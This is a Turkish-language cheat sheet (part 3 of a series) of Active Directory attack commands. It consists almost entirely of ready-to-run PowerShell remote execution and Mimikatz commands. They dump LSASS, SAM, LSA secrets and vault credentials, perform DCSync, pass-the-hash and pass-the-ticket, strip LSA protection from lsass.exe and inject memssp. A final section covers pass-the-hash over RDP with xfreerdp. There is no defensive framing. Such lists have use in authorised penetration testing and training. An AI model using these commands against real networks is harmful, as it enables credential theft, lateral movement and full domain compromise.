# Active Directory Exploitation Cheat Sheet - Bölüm 3

## Uzak Komut Çalıştırma ve Oturum Başlatma

- **Komut Çalıştır ve Oturum Başlat:**  
  ```powershell
  Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess
  Enter-PSSession -Session $sess
  ```

### Uzaktan Durumsal Komutlar Çalıştırma

- **Yeni Oturum Oluştur:**  
  ```powershell
  $sess = New-PSSession -ComputerName <NameOfComputer>
  ```

- **Oturum Üzerinde Komut Çalıştır:**  
  ```powershell
  Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
  ```

- **Komut Sonucunu Kontrol Et:**  
  ```powershell
  Invoke-Command -Session $sess -ScriptBlock {$ps}
  ```

## Mimikatz Kullanımı

- **LSASS Dump Al:**  
  ```mimikatz
  privilege::debug
  token::elevate
  sekurlsa::logonpasswords
  ```

- **Pass The Hash:**  
  ```mimikatz
  privilege::debug
  sekurlsa::pth /user:<UserName> /ntlm:<NTLMHash> /domain:<DomainFQDN>
  ```

- **Kerberos Ticketlerini Listele:**  
  `mimikatz sekurlsa::tickets`

- **Local Terminal Services Kimlik Bilgilerini Dump Et:**  
  `mimikatz sekurlsa::tspkg`

- **LSASS'i Dosyaya Kaydet ve Dump Et:**  
  `mimikatz sekurlsa::minidump c:\temp\lsass.dmp`

- **MasterKeyleri Listele:**  
  `mimikatz sekurlsa::dpapi`

- **Yerel Kerberos AES Anahtarlarını Listele:**  
  `mimikatz sekurlsa::ekeys`

- **SAM Veritabanını Dump Et:**  
  `mimikatz lsadump::sam`

- **SECRETS Veritabanını Dump Et:**  
  `mimikatz lsadump::secrets`

- **Domain Controller Kimlik Bilgilerini Inject Et ve Dump Et:**  
  ```mimikatz
  privilege::debug
  token::elevate
  lsadump::lsa /inject
  ```

- **Domain Kimlik Bilgilerini LSASS'e Dokunmadan Dump Et:**  
  `mimikatz lsadump::dcsync /domain:<DomainFQDN> /all`

- **Yerel Kerberos Kimlik Bilgilerini Listele ve Dump Et:**  
  `mimikatz kerberos::list /dump`

- **Pass The Ticket:**  
  `mimikatz kerberos::ptt <PathToKirbiFile>`

- **TS/RDP Oturumlarını Listele:**  
  `mimikatz ts::sessions`

- **Vault Kimlik Bilgilerini Listele:**  
  `mimikatz vault::list`

### LSA Korumasını Atlama

- **LSA Korumalı Süreç (Kernel Tabanlı Atlatma):**
  ```
  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
  !+
  !processprotect /process:lsass.exe /remove
  sekurlsa::logonpasswords
  ```

- **LSAISO Sanallaştırma ve Credential Guard:**
  ```
  tasklist |findstr lsaiso
  misc::memssp
  ```

## Remote Desktop Protocol (RDP)

### RestrictedAdmin ile Hash İle Geçiş

- **Mimikatz Kullanımı:**  
  ```mimikatz
  privilege::debug
  sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"
  ```

- **xFreeRDP Kullanımı:**  
  `xfreerdp /u:<Username> /pth:<NTLMHash> /d:<DomainName> /v:<Target>`
